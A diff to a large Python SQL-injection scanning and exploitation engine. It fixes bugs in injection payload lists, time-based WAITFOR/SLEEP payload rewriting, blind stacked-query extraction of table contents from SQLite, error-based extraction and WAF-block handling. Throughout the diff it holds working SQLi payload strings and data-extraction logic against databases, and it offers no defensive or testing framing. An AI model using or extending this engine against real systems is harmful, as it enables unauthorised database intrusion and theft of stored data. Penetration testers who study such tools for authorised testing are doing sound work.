@@ -21005,7 +21005,7 @@ async def retry_on_429(func, *args, phase: str = "unknown", max_hours: int = 24,
             
             # Check if exception has a response attribute with status_code
             if hasattr(e, 'response') and hasattr(e.response, 'status_code'):
-                if e._get_safe_status_code(response) == 429:
+                if e.response.status_code == 429:
                     is_429 = True
             
             # If not 429, re-raise immediately
@@ -28755,7 +28755,7 @@ class HTTPEngine:
                     except (UnicodeDecodeError, AttributeError, TypeError):
                         _hv_str = _hv.decode('latin-1', errors='replace') if isinstance(_hv, bytes) else "" # Fallback
                     _clean = ''.join(
-                        c if (0x20 <= ord(c) <= 0x7E or c == '\t') else ' '
+                        c if (0x20 <= ord(c) <= 0x7E) else ' '
                         for c in _hv_str
                     )
                     if _clean != _hv_str:
@@ -105148,8 +105148,9 @@ class TechniqueCascadeEngine:
                     (f" AND (SELECT 1 FROM {_nonexist_tbl})-- -", "table-num"),
                     (f"' AND (SELECT {_nonexist_tbl}_col FROM sqlite_master)-- -", "column"),
                     (f" AND (SELECT {_nonexist_tbl}_col FROM sqlite_master)-- -", "column-num"),
-                    ("' AND (SELECT CAST(tbl_name AS REAL) FROM sqlite_master WHERE type='table' AND tbl_name NOT NULL LIMIT 1) < 0-- -", "cast_tbl"),
-                    (" AND (SELECT CAST(tbl_name AS REAL) FROM sqlite_master WHERE type='table' AND tbl_name NOT NULL LIMIT 1) < 0-- -", "cast_tbl-num"),
+                    # BUG-SQLITE-CASTTBL-DEADCODE-FIX: CAST(tbl_name AS REAL) silently returns
+                    # 0.0 in SQLite for non-numeric strings; '0.0 < 0' is always FALSE, so
+                    # these two entries never triggered an error and wasted 2 HTTP probes each run.
                 ]
             elif dbms == "MSSQL":
                 _c_fallbacks = [
@@ -106066,8 +106067,6 @@ class TechniqueCascadeEngine:
                 _skip_reason = "error-trigger payload (EXTRACTVALUE/CAST AS NUMBER — error page diff always large)"
             elif tech in ("T", "S", "HQ", "TH", "BT"):
                 _skip_reason = "timing/stacked technique (body never changes with SLEEP/delay)"
-            elif tech in ("E", "EH"):
-                _skip_reason = "error-based technique (error page diff always large — not diagnostic)"
             elif tech in ("B", "BH", "IN"):
                 _skip_reason = "boolean technique (Check A already covers this mechanism)"
             elif tech in ("U", "UE", "UH"):
@@ -106355,7 +106354,7 @@ class TechniqueCascadeEngine:
                         _waitfor_new = "0.001"
             except (TypeError, ValueError):
                 _waitfor_new = str(new_val)
-            _wf_pat = (r"(WAITFOR\s+DELAY\s*['\"])\d+:\d+:" + _re.escape(old_s))
+            _wf_pat = (r"(WAITFOR\s+DELAY\s*['\"])\d+:\d+:0*" + _re.escape(old_s))
             _wf_repl = r"\g<1>0:0:" + _waitfor_new
             _patterns = [
                 (r'(SLEEP\s*\(\s*)' + _re.escape(old_s), r'\g<1>' + new_s),
@@ -106764,7 +106763,9 @@ class TechniqueCascadeEngine:
                     # hour/minute prefixes.  Certified payloads use '00:00:N' (two-digit),
                     # so the WAITFOR branch NEVER fired and the naive fallback corrupted SQL.
                     # New pattern matches any hh:mm: prefix and rewrites only the seconds.
-                    _wf_pat = (r"(WAITFOR\s+DELAY\s*['\"])\d+:\d+:" + _re.escape(old_s))
+                    # BUG-WAITFOR-ZEROPED-FIX: zero-padded seconds (e.g. '0:00:05') were not
+                    # matched because the pattern required exact digit count. Added 0* prefix.
+                    _wf_pat = (r"(WAITFOR\s+DELAY\s*['\"])\d+:\d+:0*" + _re.escape(old_s))
                     # _waitfor_new is now just seconds (e.g. "4"), _wf_repl adds "0:0:" prefix
                     _wf_repl = r"\g<1>0:0:" + _waitfor_new
                     _patterns = [
@@ -107782,7 +107783,7 @@ class TechniqueCascadeEngine:
                 # BUG-R3A FIX (Part 2): Use integer half for compute payloads
                 # (BENCHMARK/RANDOMBLOB/GENERATE_SERIES need integer args).
                 _is_int_arg_fb = bool(re.search(
-                    r'BENCHMARK|RANDOMBLOB|GENERATE_SERIES', _bt, re.IGNORECASE))
+                    r'BENCHMARK|RANDOMBLOB|GENERATE_SERIES|WAITFOR', _bt, re.IGNORECASE))
                 _half_sleep_raw = max(0.05, _sleep_sec / 2.0)  # BUG-CHECKB-HALF-SLEEP-FLOOR FIX:
                 # Old floor was max(0.5, ...) — for pg_sleep(0.1) this produced a "half-sleep"
                 # of 0.5s (5× the original!). The proportionality check then required
@@ -110870,7 +110871,7 @@ class TechniqueCascadeEngine:
                 self._dbms_block_run = {}
             self._dbms_block_run[dbms] = self._dbms_block_run.get(dbms, 0) + 1
 
-        if tech == "E":
+        if tech in ("E", "EH"):
             # WAF block pages sometimes contain HTML with SQL-looking fragments;
             # skip error detection entirely when the response is a WAF intercept.
             if _waf_blocked:
@@ -111247,7 +111248,7 @@ class TechniqueCascadeEngine:
                 except Exception as _e_cc_err:
                     LOG.debug(f"[cross-cat-E-timing] confirmation error: {_e_cc_err}")
 
-        elif tech in ("B", "NV", "WB", "EX", "HY", "ST"):
+        elif tech in ("B", "BH", "NV", "WB", "EX", "HY", "ST"):
             # BUG-FIX-2-CROSS-CAT-TIMING (Issue 2/12): Cross-category dispatch sends ALL 10
             # payload categories through ALL 17 technique oracles. This means Timebased payloads
             # (containing SLEEP/WAITFOR/PG_SLEEP) can reach the Boolean oracle (tech=B, NV, etc.)
@@ -112018,7 +112019,7 @@ class TechniqueCascadeEngine:
                                     pass
                                 return _det_uh_e
 
-        elif tech == "T":
+        elif tech in ("T", "TH"):
             # Always show timing comparison for T technique.
             _ref = min(baseline.get("mean_timing",100), 200)
             _diff_t = max(_ref * 2.5, _ref + 400)
@@ -122452,6 +122453,7 @@ class ScannerV14(ScannerV13):
                 _ACTIVE_GATE[0] = _gate
                 _rate_ctrl = _gate  # backward compat for old code paths
                 _SCAN_STOPPED[0] = False    # reset for this scan (may be True from previous run)
+                TechniqueCascadeEngineV18._CLASS_DBMS_BANNER_PRINTED.clear()  # BUG-DBMS-TRIPLE-PRINT FIX
                 _EXTRACTION_TASK[0] = None  # reset extraction task ref
                 # BUG-R5-1 FIX: Only reset _EXTRACTION_STARTED when no extraction
                 # task is actively running.  Unconditional reset here could let the
@@ -126206,9 +126208,6 @@ class SafeModeVerifier:
                     # No WAF, no signal  still use FULL (target may need specific payloads)
                     oracle_mode = OracleMode.FULL
                     can_scan    = True
-
-        if not boolean_capable and not errors_visible:
-            warnings.append("Neither error nor boolean signal detected on clean probes  may be blind-only")
 
         report = self.VerificationReport(
             reachable=reachable, stable=stable,
@@ -137046,7 +137045,11 @@ class StackedQueryExtractor:
                 # BUG-STACKED-SQLITE-FIX: SQLite was entirely unhandled (returned None)
                 char_func = f"COALESCE(UNICODE(SUBSTR((SELECT * FROM {_stacked_eff_table} LIMIT 1),{pos},1)),0)"
                 sleep_func = "LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(4000000))))"
-                low, high = 32, 1114111  # UNICODE() covers full Unicode scalar range
+                # BUG-STACKED-SQLITE-LOW32-FIX: was low=32, which caused the `char_value < 32`
+                # EOS guard below to trigger on any control character (newline=10, tab=9, null=0),
+                # silently truncating strings at the first non-printable character.  low=0 matches
+                # MySQL/PostgreSQL behaviour — COALESCE(UNICODE(...),0)=0 is the true EOS sentinel.
+                low, high = 0, 1114111  # UNICODE() covers full Unicode scalar range
             elif self.dbms == "Oracle":
                 char_func = (
                     f"(SELECT CASE WHEN NVL(ASCII(c__),0) BETWEEN 1 AND 127 THEN ASCII(c__) "
@@ -152166,6 +152169,12 @@ class TechniqueCascadeEngineV18(TechniqueCascadeEngine):
         "Reblaze":       ["U", "E"],
     }
 
+    # Class-level set tracking which DBMS banners have been printed this scan.
+    # Shared across all concurrent V18 instances (one per parallel surface) to
+    # ensure the DBMS box prints exactly once per DBMS regardless of how many
+    # surfaces are scanning concurrently.  Reset at the start of each endpoint scan.
+    _CLASS_DBMS_BANNER_PRINTED: set = set()
+
     # Base prior success rates per technique (from broad empirical data)
     # BUG-R2-A FIX: Added all 17 canonical technique codes so none fall back to
     # the 0.3 default and get incorrectly deprioritised. Codes derived from base
@@ -152413,10 +152422,13 @@ class TechniqueCascadeEngineV18(TechniqueCascadeEngine):
             if dbms not in self._dbms_tried:
                 self._dbms_tried.append(dbms)
 
-            # ── DBMS scan banner: printed once per DBMS block (AFTER stop checks) ──
-            print('\n[*] ╔══════════════════════════════════════════════════════╗', flush=True)
-            print(f'[*] ║  DBMS [{_dbms_idx}/{_n_dbmses}]: {dbms:<12s} | {_n_cats} categories x 300 payloads ║', flush=True)
-            print('[*] ╚══════════════════════════════════════════════════════╝', flush=True)
+            # ── DBMS scan banner: printed ONCE globally per DBMS across all parallel surfaces ──
+            _banner_key = (dbms, _dbms_idx)
+            if _banner_key not in TechniqueCascadeEngineV18._CLASS_DBMS_BANNER_PRINTED:
+                TechniqueCascadeEngineV18._CLASS_DBMS_BANNER_PRINTED.add(_banner_key)
+                print('\n[*] ╔══════════════════════════════════════════════════════╗', flush=True)
+                print(f'[*] ║  DBMS [{_dbms_idx}/{_n_dbmses}]: {dbms:<12s} | {_n_cats} categories x 300 payloads ║', flush=True)
+                print('[*] ╚══════════════════════════════════════════════════════╝', flush=True)
             
             # Use DBMS_TECHNIQUE_MAP and expand to 500 payloads for level 5
             # BUG-CASCADE-DOUBLE-SLICE FIX Part B (Req 6): Pass level=5 to
@@ -161310,6 +161322,16 @@ class ErrorBasedExtractor:
     
     async def try_extract(self, method, url, data, data_fmt, param, original,
                            dbms, sql_expr) -> Optional[str]:
+        # BUG-SQLITE-ERREXT-PROBE-WASTE FIX: SQLite CAST_TEMPLATES are probe-only — they
+        # trigger division-by-zero errors but the error message does NOT embed the target
+        # value (see LEAK_PATTERNS: no SQLite-specific capture group exists).  Sending
+        # 8-12 probes to the target that all return None wastes round-trips and generates
+        # misleading log output.  Skip extraction immediately; the caller falls back to
+        # blind boolean / time-based paths which do work for SQLite.
+        if dbms == "SQLite":
+            LOG.debug("[ErrorBasedExtractor] SQLite: skipping error-based extraction "
+                      "(SQLite errors do not embed value — using blind oracle instead)")
+            return None
         templates = self.CAST_TEMPLATES.get(dbms, self.CAST_TEMPLATES.get("MySQL", []))
         
         # Try with tamper chain first, then raw
